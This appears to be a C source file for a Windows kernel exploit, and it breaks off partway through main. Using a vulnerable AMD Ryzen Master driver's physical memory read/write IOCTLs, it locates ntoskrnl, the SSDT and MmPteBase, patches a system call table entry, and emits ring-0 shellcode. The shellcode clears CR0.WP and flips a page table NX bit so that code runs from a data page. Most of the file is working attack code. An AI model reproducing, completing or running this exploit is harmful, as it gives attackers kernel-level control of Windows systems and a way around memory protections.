/*
 * pte_flip.c — PTE NX-bit flip via MmPteBase + CR0.WP bypass
 *
 * Revised approach (Hyper-V-compatible):
 *   Physical page-table pages are protected by the hypervisor SLAT — they
 *   cannot be read or written via the AMD physical R/W IOCTL.  The original
 *   scan-based PDE/PTE finder therefore finds nothing.
 *
 *   Instead we:
 *   1. Pattern-scan ntoskrnl .text (readable, contiguous) for the inline
 *      MiGetPteAddress sequence:
 *        48 C1 F8/E8 09          ; sar/shr rax, 9
 *        ...
 *        48 03 05 [disp32]       ; add rax, [rip+disp] ← RIP-rel ptr to MmPteBase
 *      Dereference the RIP-relative pointer to extract MmPteBase value.
 *   2. Compute PTE_VA = ((payload_va >> 9) & ~7) + MmPteBase  in usermode.
 *   3. Build SSDT shellcode that, from ring-0:
 *        a. Clear CR0.WP   (allows kernel writes to write-protected pages)
 *        b. LOCK BTR [PTE_VA], 63   (clears NX bit in PTE via VA)
 *        c. Restore CR0.WP
 *        d. INVLPG [payload_page_va]  (flush TLB for the target page)
 *        e. JMP  data_payload_va      (jump to shellcode now in .data)
 *   4. .data payload (written by us via physical write):
 *        Write signal → JMP original_fn
 *   5. Restore: trigger NX-restore shellcode (BTS instead of BTR).
 *
 * Why this works on Hyper-V:
 *   CR0.WP is a per-VCPU register; clearing it from ring-0 shellcode only
 *   affects the current logical CPU and is not intercepted by Hyper-V.
 *   PTE writes via kernel VA are indistinguishable from normal kernel writes.
 *   HVCI (Hypervisor Code Integrity) would block this — but HVCI is not
 *   enabled on this guest (confirmed by successful SSDT patch earlier).
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o pte_flip.exe pte_flip.c
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i=0;;i++) {
        vn=sizeof vname; vd=0;
        if (RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf=(uint8_t*)malloc(vd); if(!buf) continue;
        if (RegQueryValueExA(h,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(h);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0;i<g_nranges;i++)
        if (pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

#define IO_BUFSZ (4096+12)
static uint8_t g_io_buf[IO_BUFSZ];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12]; *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz;
    uint32_t osz=12+sz;
    uint8_t *out; void *dyn=NULL;
    if (osz<=IO_BUFSZ) out=g_io_buf;
    else {dyn=malloc(osz);if(!dyn)return 0;out=(uint8_t*)dyn;}
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,in,12,out,osz,&got,NULL);
    if (ok&&got>=12) memcpy(buf,out+12,sz);
    free(dyn);
    return ok&&got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa,sz)){printf("  [!] BLOCKED write PA 0x%"PRIX64"\n",pa);return 0;}
    uint32_t isz=12+sz; uint8_t *in=(uint8_t*)malloc(isz);if(!in)return 0;
    *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz; memcpy(in+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in,isz,NULL,0,&got,NULL);
    free(in); return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * §2  KERNEL MODULE ENUMERATION
 * ══════════════════════════════════════════════════════════════════════ */

typedef struct { uint64_t va_base; uint32_t size; char name[64]; } KernelMod;
#define MAX_MODS 256
static KernelMod g_mods[MAX_MODS];
static int g_nmod = 0;

static int load_kernel_modules(void)
{
    typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG,PVOID,ULONG,PULONG);
    NtQSI_t fn=(NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if (!fn) return 0;
    typedef struct{HANDLE S;PVOID MB,IB;ULONG IS,F;USHORT L,I,Lc,O;CHAR P[256];}MOD;
    typedef struct{ULONG C;MOD M[1];}ML;
    ULONG sz=0x40000; ML *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(ML*)malloc(sz*=2);if(!ml)return 0;st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return 0;}
    g_nmod=(int)ml->C>MAX_MODS?MAX_MODS:(int)ml->C;
    for(int i=0;i<g_nmod;i++){
        g_mods[i].va_base=(uint64_t)ml->M[i].IB;
        g_mods[i].size=ml->M[i].IS;
        char *p=strrchr(ml->M[i].P,'\\');
        strncpy(g_mods[i].name,p?p+1:ml->M[i].P,63);
    }
    free(ml); return g_nmod;
}

static KernelMod *find_mod(const char *n)
{
    for(int i=0;i<g_nmod;i++) if(_stricmp(g_mods[i].name,n)==0) return &g_mods[i];
    return NULL;
}

/* ══════════════════════════════════════════════════════════════════════
 * §3  MODULE PHYSICAL BASE FINDER
 * ══════════════════════════════════════════════════════════════════════ */

static uint64_t find_module_phys_base(const char *disk, uint64_t va, int64_t *delta)
{
    uint8_t sig[64]={0};
    HANDLE f=CreateFileA(disk,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(f==INVALID_HANDLE_VALUE) return 0;
    DWORD rd=0; ReadFile(f,sig,64,&rd,NULL); CloseHandle(f);
    if(rd<16||sig[0]!='M'||sig[1]!='Z') return 0;
    static uint8_t pg[4096];
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t rend=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t pa=g_ranges[ri].base;pa<rend;pa+=0x1000){
            if(!phys_read(pa,pg,4096)) continue;
            if(pg[0]!='M'||pg[1]!='Z') continue;
            if(memcmp(pg,sig,64)!=0) continue;
            const char *bn=strrchr(disk,'\\');
            printf("  [+] %-20s PA=0x%012"PRIX64"\n",bn?bn+1:disk,pa);
            if(delta&&va) *delta=(int64_t)pa-(int64_t)va;
            return pa;
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §4  KSDT FINDER
 * ══════════════════════════════════════════════════════════════════════ */

static int find_ksdt(uint64_t ntp,uint64_t ntv,uint32_t nts,
                     uint64_t w32v,uint32_t w32s,    /* pass 0,0 if win32k unknown */
                     uint64_t *kp,uint64_t *kv)
{
    static uint8_t pg[4096];
    for(uint32_t off=0;off<nts;off+=0x1000){
        uint64_t pa=ntp+off;
        if(!phys_read(pa,pg,4096)) continue;
        for(uint32_t i=0;i+64<=4096;i+=8){
            uint64_t b0,c0,b1,c1;uint32_t l0,l1;
            memcpy(&b0,pg+i,8);memcpy(&c0,pg+i+8,8);memcpy(&l0,pg+i+16,4);
            memcpy(&b1,pg+i+32,8);memcpy(&c1,pg+i+40,8);memcpy(&l1,pg+i+48,4);
            /* entry[0]: must be in ntoskrnl */
            if(b0<ntv||b0>=ntv+nts) continue;
            if(c0!=0||l0<0x100||l0>0x350) continue;
            /* entry[1]: if win32k known, check range; otherwise skip entirely.
             * When win32k isn't loaded, entry[1].Base=0 → canonical check fails.
             * Compensate with entry[0] Number field (arg-count table in ntoskrnl). */
            if(w32v && w32s){
                if(b1<w32v||b1>=w32v+w32s) continue;
                if(c1!=0||l1<0x200||l1>0x700) continue;
            } else {
                /* Extra entry[0] validation: Number ptr must be in ntoskrnl or NULL */
                uint64_t num0; memcpy(&num0,pg+i+24,8);
                if(num0!=0&&(num0<ntv||num0>=ntv+nts)) continue;
            }
            printf("  [+] KSDT @ PA 0x%012"PRIX64"\n",pa+i);
            printf("      KiServiceTable VA=0x%016"PRIX64"  Limit=%u\n",b0,l0);
            if(b1) printf("      ShadowTable  VA=0x%016"PRIX64"  Limit=%u\n",b1,l1);
            *kp=pa+i; *kv=b0; return 1;
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §5  SSN LOOKUP
 * ══════════════════════════════════════════════════════════════════════ */

static uint32_t get_ssn(const char *fn)
{
    HMODULE h=GetModuleHandleA("ntdll.dll");
    void *p=GetProcAddress(h,fn);
    if(!p) return 0;
    uint8_t *b=(uint8_t*)p;
    if(b[0]==0x4C&&b[1]==0x8B&&b[2]==0xD1&&b[3]==0xB8){
        uint32_t ssn; memcpy(&ssn,b+4,4);
        printf("  [*] %-30s SSN=0x%X\n",fn,ssn);
        return ssn;
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §6  PE SECTION SCANNER
 * ══════════════════════════════════════════════════════════════════════ */

static int get_sections(const char *disk,uint32_t msz,uint32_t req,uint32_t excl,
                         uint32_t rva[],uint32_t sz[],int max)
{
    HANDLE f=CreateFileA(disk,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(f==INVALID_HANDLE_VALUE) return 0;
    uint8_t hdr[4096]={0};DWORD rd=0;ReadFile(f,hdr,sizeof hdr,&rd,NULL);CloseHandle(f);
    if(rd<0x40) return 0;
    uint32_t pe=*(uint32_t*)(hdr+0x3C);
    if(pe+0x18>rd||*(uint32_t*)(hdr+pe)!=0x00004550) return 0;
    uint16_t ns=*(uint16_t*)(hdr+pe+6),os=*(uint16_t*)(hdr+pe+20);
    uint32_t so=pe+24+os;
    int found=0;
    for(int i=0;i<ns&&found<max;i++){
        uint32_t o=so+(uint32_t)i*40;
        if(o+40>rd) break;
        uint32_t ch=*(uint32_t*)(hdr+o+36);
        uint32_t vs=*(uint32_t*)(hdr+o+16);
        uint32_t vr=*(uint32_t*)(hdr+o+12);
        if((ch&req)!=req||(ch&excl)) continue;
        if(!vs||vr+vs>msz) continue;
        char nm[9]={0};memcpy(nm,hdr+o,8);
        printf("  [*] Section %-8s  RVA=0x%06X  sz=0x%X\n",nm,vr,vs);
        rva[found]=vr;sz[found]=vs;found++;
    }
    return found;
}

/* ══════════════════════════════════════════════════════════════════════
 * §7  REGION FINDERS
 * ══════════════════════════════════════════════════════════════════════ */

#define CC_REGION_SZ   64
#define CC_MIN_RUN     64
#define DATA_REGION_SZ 96

static int find_cc_region(uint64_t phys,uint64_t va,uint32_t msz,const char *disk,
                           uint64_t *rva_out,uint64_t *pa_out,uint8_t *saved)
{
    uint32_t rva[16],sz[16];
    int ns=get_sections(disk,msz,0x20000000,0,rva,sz,16);
    if(!ns){rva[0]=0;sz[0]=msz;ns=1;}
    static uint8_t pg[4096];
    for(int s=0;s<ns;s++){
        uint32_t s0=rva[s]&~0xFFFu,se=(rva[s]+sz[s]+0xFFFu)&~0xFFFu;
        if(se>msz) se=msz;
        for(uint32_t off=s0;off<se;off+=0x1000){
            uint64_t pa2=phys+off;
            if(!phys_read(pa2,pg,4096)) continue;
            for(uint32_t i=0;i+CC_REGION_SZ<=4096;i++){
                if(pg[i]!=0xCC) continue;
                uint32_t run=0;
                while(i+run<4096&&pg[i+run]==0xCC) run++;
                if(run<CC_MIN_RUN){i+=run;continue;}
                *pa_out=pa2+i;*rva_out=va+off+i;
                memcpy(saved,pg+i,CC_REGION_SZ);
                printf("  [+] .text CC run=%u  VA=0x%016"PRIX64"  PA=0x%012"PRIX64"\n",
                       run,*rva_out,*pa_out);
                return 1;
            }
        }
    }
    return 0;
}

static int find_zero_region(uint64_t phys,uint64_t va,uint32_t msz,const char *disk,
                              uint64_t *rva_out,uint64_t *pa_out,uint8_t *saved)
{
    uint32_t rva[8],sz[8];
    int ns=get_sections(disk,msz,0x80000000,0x20000000,rva,sz,8);
    if(!ns) return 0;
    static uint8_t pg[4096];
    for(int s=0;s<ns;s++){
        uint32_t s0=rva[s]&~0xFFFu,se=(rva[s]+sz[s]+0xFFFu)&~0xFFFu;
        if(se>msz) se=msz;
        for(uint32_t off=s0;off<se;off+=0x1000){
            uint64_t pa2=phys+off;
            if(!phys_read(pa2,pg,4096)) continue;
            for(uint32_t i=0;i+DATA_REGION_SZ<=4096;i++){
                if(pg[i]!=0||((pa2+i)&7)) continue;
                uint32_t run=0;
                while(i+run<4096&&pg[i+run]==0) run++;
                if(run<DATA_REGION_SZ){i+=run;continue;}
                *pa_out=pa2+i;*rva_out=va+off+i;
                memcpy(saved,pg+i,DATA_REGION_SZ);
                printf("  [+] .data zero run=%u  VA=0x%016"PRIX64"  PA=0x%012"PRIX64"\n",
                       run,*rva_out,*pa_out);
                return 1;
            }
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §8  MmPteBase FINDER
 *
 * Windows MiGetPteAddress inline sequence in ntoskrnl .text:
 *   48 C1 F8 09   ; sar rax, 9     (arithmetic)  ← scan for this
 *   OR
 *   48 C1 E8 09   ; shr rax, 9     (logical)
 *   ...
 *   48 03 05 XX XX XX XX ; add rax, [rip+disp32]  ← disp32 → MmPteBase
 *
 * MmPteBase is a pointer in ntoskrnl .data pointing to the PTE map base.
 * From usermode: we read the value at the RIP-relative address to get
 * the actual MmPteBase value (a kernel VA, page-aligned).
 *
 * Given MmPteBase, the PTE VA for any kernel VA is:
 *   pte_va = ((target_va >> 9) & ~7) + MmPteBase
 * ══════════════════════════════════════════════════════════════════════ */

/*
 * find_mmptebase — frequency-based scan for MmPteBase
 *
 * Strategy: MmPteBase is a global in ntoskrnl .data that is referenced by
 * many functions (MiGetPteAddress inlined everywhere).  Instead of relying
 * on a specific instruction pattern before the reference, we:
 *   1. Scan ALL ADD r64,[RIP+disp32] and MOV r64,[RIP+disp32] instructions
 *      in every ntoskrnl page.
 *   2. For each, if the target VA is within ntoskrnl and contains a
 *      page-aligned canonical kernel VA not within ntoskrnl itself,
 *      count how many times that value is referenced.
 *   3. Return the most-frequently-referenced value — that is MmPteBase.
 *
 * This handles all compiler variants:
 *   ADD rax,[RIP+x]    (48 03 05 ..)
 *   ADD rcx,[RIP+x]    (48 03 0D ..)
 *   MOV rax,[RIP+x]    (48 8B 05 ..)
 *   MOV r9, [RIP+x]    (4C 8B 0D ..)
 *   etc.
 */
static uint64_t find_mmptebase(uint64_t nt_phys, uint64_t nt_va, uint32_t nt_size,
                                int64_t nt_delta)
{
    static uint8_t pg[4096];

#define MAX_CAND 32
    uint64_t cand_val[MAX_CAND]; int cand_cnt[MAX_CAND]; int ncand=0;
    memset(cand_val,0,sizeof cand_val); memset(cand_cnt,0,sizeof cand_cnt);

    for (uint32_t off = 0; off < nt_size; off += 0x1000) {
        if (!phys_read(nt_phys+off, pg, 4096)) continue;

        for (int i = 0; i < (int)4096-8; i++) {
            uint8_t rex=pg[i];
            /* REX.W prefix: 48/49/4C/4D */
            if (rex!=0x48&&rex!=0x49&&rex!=0x4C&&rex!=0x4D) continue;
            uint8_t op=pg[i+1];
            /* ADD r64,[RIP+d32]: op=0x03  /  MOV r64,[RIP+d32]: op=0x8B */
            if (op!=0x03 && op!=0x8B) continue;
            /* ModRM: mod=00, rm=101 → (modrm & 0xC7)==0x05 — encodes [RIP+disp32] */
            if ((pg[i+2]&0xC7)!=0x05) continue;

            int32_t disp; memcpy(&disp,&pg[i+3],4);
            uint64_t insn_va = nt_va+off+(uint32_t)i;
            uint64_t rip     = insn_va+7;
            uint64_t ptr_va  = (uint64_t)((int64_t)rip+disp);

            /* ptr_va must be within ntoskrnl */
            if (ptr_va<nt_va||ptr_va>=nt_va+nt_size) continue;

            /* Read value at ptr_va */
            uint64_t ptr_pa=(uint64_t)((int64_t)ptr_va+nt_delta);
            uint64_t val=0;
            if (!phys_read(ptr_pa,&val,8)) continue;

            /* Must be page-aligned canonical kernel VA, not within ntoskrnl */
            if ((val>>48)!=0xFFFF) continue;
            if (val&0xFFF) continue;
            if (val>=nt_va&&val<nt_va+nt_size) continue;

            /* Count occurrences */
            int found=0;
            for (int k=0;k<ncand;k++){
                if (cand_val[k]==val){cand_cnt[k]++;found=1;break;}
            }
            if (!found&&ncand<MAX_CAND){
                cand_val[ncand]=val;cand_cnt[ncand]=1;ncand++;
            }
        }
    }

    /* Print top candidates */
    int best=-1,bestcnt=0;
    for (int k=0;k<ncand;k++){
        if (cand_cnt[k]>1)
            printf("  [d] candidate 0x%016"PRIX64"  refs=%d\n",cand_val[k],cand_cnt[k]);
        if (cand_cnt[k]>bestcnt){bestcnt=cand_cnt[k];best=k;}
    }

    if (best>=0&&bestcnt>=3){
        printf("  [+] MmPteBase=0x%016"PRIX64"  (referenced %d times)\n",
               cand_val[best],bestcnt);
        return cand_val[best];
    }
    printf("  [-] MmPteBase not found  (ncand=%d bestcnt=%d)\n",ncand,bestcnt);
    return 0;
#undef MAX_CAND
}

/* ══════════════════════════════════════════════════════════════════════
 * §9  SHELLCODE BUILDERS
 *
 * Layout of .data zero region:
 *   +0x00  signal1   (uint32) written by shellcode A (cr3 reader, optional)
 *   +0x10  payload   (≤32 B)  written by us — runs from .data after NX flip
 *   +0x40  signal2   (uint32) written by payload to confirm .data exec
 *
 * Shellcodes:
 *   A. cr3_reader  (in .text CC)  — reads CR3 for diagnostics
 *   B. nx_flip     (in .text CC)  — CR0.WP=0, BTR [pte_va],63, INVLPG, JMP .data
 *   C. nx_restore  (in .text CC)  — CR0.WP=0, BTS [pte_va],63, CR0.WP=1, signal, JMP orig
 *   D. data_payload(in .data)     — writes signal2, JMPs original fn
 *
 * CR0.WP (bit 16): when 0, ring-0 can write to write-protected pages.
 * This lets the shellcode write to the PTE VA even though PTE pages are
 * normally read-only.  No physical address needed — we write via VA.
 *
 * BTR [mem], imm8: F0 48 0F BA 30 3F = LOCK BTR QWORD PTR [RAX], 63
 * BTS [mem], imm8: F0 48 0F BA 28 3F = LOCK BTS QWORD PTR [RAX], 63
 * ══════════════════════════════════════════════════════════════════════ */

#define EMIT1(b)  buf[pos++]=(uint8_t)(b)
#define EMIT4(v)  do{uint32_t _=(v);memcpy(buf+pos,&_,4);pos+=4;}while(0)
#define EMIT8(v)  do{uint64_t _=(v);memcpy(buf+pos,&_,8);pos+=8;}while(0)

/* A: read CR3 + signal (diagnostic, optional) */
static int build_cr3_reader(uint8_t *buf, uint32_t bsz,
                              uint64_t signal_va, uint64_t orig_fn_va)
{
    if (bsz < 32) return 0;
    uint32_t pos = 0;
    EMIT1(0x51);                              /* push rcx */
    EMIT1(0x48);EMIT1(0xB9);EMIT8(signal_va); /* mov rcx, signal_va */
    EMIT1(0x0F);EMIT1(0x20);EMIT1(0xD8);     /* mov rax, cr3  — diagnostic only */
    EMIT1(0x48);EMIT1(0x89);EMIT1(0x01);     /* mov [rcx], rax */
    EMIT1(0x48);EMIT1(0x83);EMIT1(0xC1);EMIT1(0x08); /* add rcx, 8 */
    EMIT1(0xC7);EMIT1(0x01);EMIT4(1);        /* mov [rcx+8], 1 — signal */
    EMIT1(0x48);EMIT1(0xB8);EMIT8(orig_fn_va); /* mov rax, orig */
    EMIT1(0x59);EMIT1(0xFF);EMIT1(0xE0);     /* pop rcx; jmp rax */
    return (int)pos;
}

/* B0: PTE reader — reads PTE value via VA, stores in .data, signals.
 * SAFE: kernel reads of PTEs never fault (hypervisor allows reads).
 * Used to validate MmPteBase before attempting the dangerous write. */
static int build_pte_reader(uint8_t *buf, uint32_t bsz,
                              uint64_t pte_va,
                              uint64_t store_va,   /* .data: [0]=pte_val [8]=signal */
                              uint64_t orig_fn_va)
{
    if (bsz < 48) return 0;
    uint32_t pos = 0;
#define E1(b) buf[pos++]=(uint8_t)(b)
#define E4(v) do{uint32_t _=(v);memcpy(buf+pos,&_,4);pos+=4;}while(0)
#define E8(v) do{uint64_t _=(v);memcpy(buf+pos,&_,8);pos+=8;}while(0)
    E1(0x51);                              /* push rcx */
    E1(0x48);E1(0xB8);E8(pte_va);         /* mov rax, pte_va */
    E1(0x48);E1(0x8B);E1(0x00);           /* mov rax, [rax]  ← read PTE value */
    E1(0x48);E1(0xB9);E8(store_va);       /* mov rcx, store_va */
    E1(0x48);E1(0x89);E1(0x01);           /* mov [rcx], rax  ← store PTE val */
    E1(0x48);E1(0x83);E1(0xC1);E1(0x08); /* add rcx, 8 */
    E1(0xC7);E1(0x01);E4(1);              /* mov [rcx], 1    ← signal */
    E1(0x48);E1(0xB8);E8(orig_fn_va);
    E1(0x59);E1(0xFF);E1(0xE0);
#undef E1
#undef E4
#undef E8
    printf("  [*] pte_reader shellcode: %u bytes\n", pos);
    return (int)pos;
}

/* B: NX flip via CR0.WP bypass + INVLPG + JMP .data payload
 *
 * Byte sequence (60 bytes):
 *   51                       push rcx
 *   0F 20 C0                 mov rax, cr0
 *   50                       push rax          ← save orig cr0
 *   48 25 FF EF FF FF        and rax, ~0x10000 ← clear WP bit
 *   0F 22 C0                 mov cr0, rax
 *   48 B8 [pte_va 8B]        mov rax, pte_va
 *   F0 48 0F BA 30 3F        lock btr [rax], 63 ← clear NX bit
 *   58                       pop rax
 *   0F 22 C0                 mov cr0, rax      ← restore WP
 *   48 B8 [page_va 8B]       mov rax, page_va
 *   0F 01 38                 invlpg [rax]
 *   48 B8 [payload_va 8B]    mov rax, data_payload_va
 *   59                       pop rcx
 *   FF E0                    jmp rax
 */
static int build_nx_flip(uint8_t *buf, uint32_t bsz,
                          uint64_t pte_va,
                          uint64_t target_page_va,
                          uint64_t data_payload_va)
{
    if (bsz < 64) return 0;
    uint32_t pos = 0;
    EMIT1(0x51);                              /* push rcx */
    EMIT1(0x0F);EMIT1(0x20);EMIT1(0xC0);     /* mov rax, cr0 */
    EMIT1(0x50);                              /* push rax */
    /* and rax, ~0x10000 = and rax, 0xFFFFFFFFFFFEFFFF
     * AND RAX, imm32 (sign-extended): 48 25 [imm32]
     * ~0x10000 as int32 = 0xFFFEFFFF (sign-extends to 0xFFFFFFFFFFFEFFFF) */
    EMIT1(0x48);EMIT1(0x25);EMIT4(0xFFFEFFFF);
    EMIT1(0x0F);EMIT1(0x22);EMIT1(0xC0);     /* mov cr0, rax */
    EMIT1(0x48);EMIT1(0xB8);EMIT8(pte_va);   /* mov rax, pte_va */
    /* lock btr qword [rax], 63 = F0 48 0F BA 30 3F */
    EMIT1(0xF0);EMIT1(0x48);EMIT1(0x0F);EMIT1(0xBA);EMIT1(0x30);EMIT1(0x3F);
    EMIT1(0x58);                              /* pop rax (orig cr0) */
    EMIT1(0x0F);EMIT1(0x22);EMIT1(0xC0);     /* mov cr0, rax */
    EMIT1(0x48);EMIT1(0xB8);EMIT8(target_page_va); /* mov rax, page_va */
    EMIT1(0x0F);EMIT1(0x01);EMIT1(0x38);     /* invlpg [rax] */
    EMIT1(0x48);EMIT1(0xB8);EMIT8(data_payload_va); /* mov rax, payload_va */
    EMIT1(0x59);EMIT1(0xFF);EMIT1(0xE0);     /* pop rcx; jmp rax */
    printf("  [*] nx_flip shellcode: %u bytes\n", pos);
    printf("      PTE VA         = 0x%016"PRIX64"\n", pte_va);
    printf("      target page VA = 0x%016"PRIX64"\n", target_page_va);
    printf("      .data payload  = 0x%016"PRIX64"\n", data_payload_va);
    return (int)pos;
}

/* C: NX restore — same as flip but BTS (set bit 63) instead of BTR */
static int build_nx_restore(uint8_t *buf, uint32_t bsz,
                              uint64_t pte_va, uint64_t signal_va,
                              uint64_t orig_fn_va)
{
    if (bsz < 64) return 0;
    uint32_t pos = 0;
    EMIT1(0x51);
    EMIT1(0x0F);EMIT1(0x20);EMIT1(0xC0);   /* mov rax, cr0 */
    EMIT1(0x50);
    EMIT1(0x48);EMIT1(0x25);EMIT4(0xFFFEFFFF); /* and rax, ~WP */
    EMIT1(0x0F);EMIT1(0x22);EMIT1(0xC0);   /* mov cr0, rax */
    EMIT1(0x48);EMIT1(0xB8);EMIT8(pte_va); /* mov rax, pte_va */
    /* lock bts qword [rax], 63 = F0 48 0F BA 28 3F */
    EMIT1(0xF0);EMIT1(0x48);EMIT1(0x0F);EMIT1(0xBA);EMIT1(0x28);EMIT1(0x3F);
    EMIT1(0x58);
    EMIT1(0x0F);EMIT1(0x22);EMIT1(0xC0);   /* mov cr0, rax (restore WP) */
    EMIT1(0x48);EMIT1(0xB9);EMIT8(signal_va); /* mov rcx, signal_va */
    EMIT1(0xC7);EMIT1(0x01);EMIT4(3);      /* mov [rcx], 3 (restore done) */
    EMIT1(0x48);EMIT1(0xB8);EMIT8(orig_fn_va);
    EMIT1(0x59);EMIT1(0xFF);EMIT1(0xE0);
    printf("  [*] nx_restore shellcode: %u bytes\n", pos);
    return (int)pos;
}

/* D: data payload — runs from .data page (executable after NX flip) */
static int build_data_payload(uint8_t *buf, uint32_t bsz,
                               uint64_t signal2_va, uint64_t orig_fn_va)
{
    if (bsz < 32) return 0;
    uint32_t pos = 0;
    EMIT1(0x51);
    EMIT1(0x48);EMIT1(0xB9);EMIT8(signal2_va); /* mov rcx, signal2_va (.data) */
    EMIT1(0xC7);EMIT1(0x01);EMIT4(2);           /* mov [rcx], 2 */
    EMIT1(0x48);EMIT1(0xB8);EMIT8(orig_fn_va);
    EMIT1(0x59);EMIT1(0xFF);EMIT1(0xE0);
    printf("  [*] data_payload shellcode: %u bytes  (runs from .data)\n", pos);
    return (int)pos;
}

#undef EMIT1
#undef EMIT4
#undef EMIT8

/* ══════════════════════════════════════════════════════════════════════
 * §10  SSDT HELPERS
 * ══════════════════════════════════════════════════════════════════════ */

static int ssdt_patch(uint64_t kisvc_va, uint64_t kisvc_pa,
                       uint32_t idx, uint64_t sc_va, int32_t *orig_out)
{
    uint64_t epa = kisvc_pa + (uint64_t)idx*4;
    int32_t orig=0;
    if (!phys_read(epa,&orig,4)) return 0;
    *orig_out = orig;
    int64_t delta = (int64_t)sc_va - (int64_t)kisvc_va;
    if (delta>(int64_t)0x07FFFFFF||delta<-(int64_t)0x08000000){
        printf("  [-] delta overflow\n"); return 0;
    }
    int32_t nent=(int32_t)(delta<<4);
    uint64_t vfy=(uint64_t)((int64_t)kisvc_va+((int32_t)nent>>4));
    if(vfy!=sc_va){printf("  [-] encode mismatch\n");return 0;}
    if(!phys_write(epa,&nent,4)) return 0;
    printf("  [+] SSDT[%u] patched  entry=0x%08X\n",idx,(uint32_t)nent);
    return 1;
}

static void ssdt_restore(uint64_t kisvc_pa, uint32_t idx, int32_t orig)
{
    phys_write(kisvc_pa+(uint64_t)idx*4, &orig, 4);
    printf("  [+] SSDT[%u] restored\n", idx);
}

/* ══════════════════════════════════════════════════════════════════════
 * §11  MAIN
 * ══════════════════════════════════════════════════════════════════════ */

int main(void)
{
    printf("=== PTE NX-bit Flip via CR0.WP bypass (AMD Physical R/W) ===\n\n");

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,
                      FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){
        printf("[-] Cannot open AMD driver: %lu\n",GetLastError());return 1;}
    printf("[+] Driver opened\n");
    load_ranges();

    printf("\n[*] Enumerating kernel modules...\n");
    if(!load_kernel_modules()) return 1;
    KernelMod *nt=find_mod("ntoskrnl.exe");
    if(!nt){printf("[-] ntoskrnl not found\n");return 1;}
    printf("[+] ntoskrnl  VA=0x%016"PRIX64"  size=0x%X\n",nt->va_base,nt->size);
    KernelMod *w32=find_mod("win32k.sys");
    if(!w32){LoadLibraryA("user32.dll");GetForegroundWindow();
             load_kernel_modules();w32=find_mod("win32k.sys");}

    printf("\n[*] Finding ntoskrnl physical base...\n");
    int64_t nt_delta=0;
    uint64_t nt_phys=find_module_phys_base("C:\\Windows\\System32\\ntoskrnl.exe",
                                            nt->va_base,&nt_delta);
    if(!nt_phys) return 1;

    printf("\n[*] Finding KiServiceTable...\n");
    uint64_t ksdt_pa=0,kisvc_va=0;
    if(!find_ksdt(nt_phys,nt->va_base,nt->size,
                   w32 ? w32->va_base : 0,
                   w32 ? w32->size    : 0,
                   &ksdt_pa,&kisvc_va)){
        printf("[-] KSDT not found\n");return 1;}
    uint64_t kisvc_pa=(uint64_t)((int64_t)kisvc_va+nt_delta);

    uint32_t ssn=get_ssn("ZwTestAlert");
    if(!ssn) ssn=get_ssn("ZwYieldExecution");
    if(!ssn){printf("[-] No SSN\n");return 1;}
    uint32_t ssdt_idx=ssn&0xFFF;
    int32_t orig_entry=0;
    phys_read(kisvc_pa+(uint64_t)ssdt_idx*4,&orig_entry,4);
    int64_t d0=(int64_t)((int32_t)orig_entry>>4);
